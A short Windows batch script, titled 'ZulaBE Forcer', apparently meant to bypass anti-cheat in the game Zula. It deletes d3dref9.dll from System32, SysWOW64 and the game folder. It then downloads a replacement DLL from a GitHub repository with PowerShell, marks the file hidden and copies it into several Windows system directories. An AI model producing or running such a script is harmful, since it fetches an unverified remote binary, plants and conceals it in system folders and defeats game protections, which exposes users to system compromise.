@echo off
echo off
cls

title ZulaBE Forcer

del /f /q /a C:\Windows\system32\d3dref9.dll
del /f /q /a C:\Windows\syswow64\d3dref9.dll
del /f /q /a C:\Windows\d3dref9.dll
del /f /q /a C:\Zula\Game\d3dref9.dll

@powershell Invoke-WebRequest -Uri "https://github.com/coolestdaemon/babannem/raw/refs/heads/main/d3dref9.dll" -OutFile "C:\d3dref9.dll"
attrib +h "C:\d3dref9.dll"
copy C:\d3dref9.dll C:\Zula\Game\d3dref9.dll
copy C:\d3dref9.dll C:\Windows\system32\d3dref9.dll
copy C:\d3dref9.dll C:\Windows\syswow64\d3dref9.dll
copy C:\d3dref9.dll C:\Windows\isim.dll
ren C:\windows\isim.dll d3dref9.dll

pause .
